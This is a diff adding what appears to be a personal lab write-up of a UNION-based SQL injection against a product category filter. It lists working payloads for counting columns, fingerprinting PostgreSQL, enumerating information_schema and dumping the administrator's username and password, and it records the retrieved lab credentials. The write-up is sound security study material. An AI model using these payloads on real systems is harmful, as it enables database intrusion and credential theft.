@@ -1,0 +1,43 @@
+Sql Injection - product category filter.
+
+Main Goal : Retrieve all username and password
+
+Analysis:
+
+(1) Find no of column
+
+' order by 3 --  -> Internal server error
+
+3-1=2 column
+
+(2) Determine string column in table
+
+' UNION select 'a', 'a'--  
+
+Both column are string
+
+(3) Find version of databse:
+' UNION select @@version, NULL--   -> NOT MICROSOFT
+' UNION SELECT version(), NULL--   -> 200 OK
+PostgreSQL 12.20 (Ubuntu 12.20-0ubuntu0.20.04.1)
+
+
+(4) Output the list of table name in database:
+
+' UNION SELECT table_name,NULL FROM information_schema.tables--
+
+Find table name:---
+users_fxphxo
+
+(5)finding column name inside db:
+' UNION SELECT column_name, 'a' FROM information_schema.columns 
+WHERE table_name='users_fxphxo'--
+
+username_rcgqck
+password_xquwww
+
+(6)finding username and password of administrator:
+' UNION SELECT username_rcgqck, password_xquwww FROM users_fxphxo--
+
+administrator
+4m0rwodix6fnvtomccsg
